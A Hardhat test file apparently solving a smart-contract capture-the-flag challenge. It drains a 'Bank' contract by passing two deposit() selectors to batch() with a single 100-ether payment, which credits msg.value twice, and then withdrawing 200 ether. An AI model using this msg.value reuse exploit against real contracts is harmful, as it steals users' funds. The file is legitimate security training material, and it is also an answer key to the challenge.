import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { Bank, BankChallenge } from '../typechain-types'

const toWei = ethers.utils.parseEther

describe('BankChallenge', async function () {
  let player: SignerWithAddress
  let challenge: BankChallenge

  before(async function () {
    ;[player] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('BankChallenge')
    challenge = (await Challenge.deploy({
      value: toWei('100'),
    })) as BankChallenge
  })

  it('Attack', async function () {
    const bank = (await ethers.getContractAt(
      'Bank',
      await challenge.bank()
    )) as Bank
    const depositSig = bank.interface.getSighash(
      bank.interface.functions['deposit()']
    )

    await bank.batch([depositSig, depositSig], false, { value: toWei('100') })
    await bank.withdraw(toWei('200'))
    // await challenge
    expect(await challenge.isSolved()).to.be.true
  })
})
